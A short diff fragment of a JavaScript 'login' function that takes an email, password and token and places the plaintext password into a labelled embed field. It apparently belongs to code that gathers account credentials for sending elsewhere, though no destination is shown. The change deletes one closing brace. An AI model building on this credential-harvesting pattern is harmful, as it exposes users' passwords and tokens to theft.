@@ -364,7 +364,6 @@ const login = async (email, password, token) => {
             name: "Password::",
             value: `\`${password}\``,
             inline: false,
-          },
       },
     ],
   };
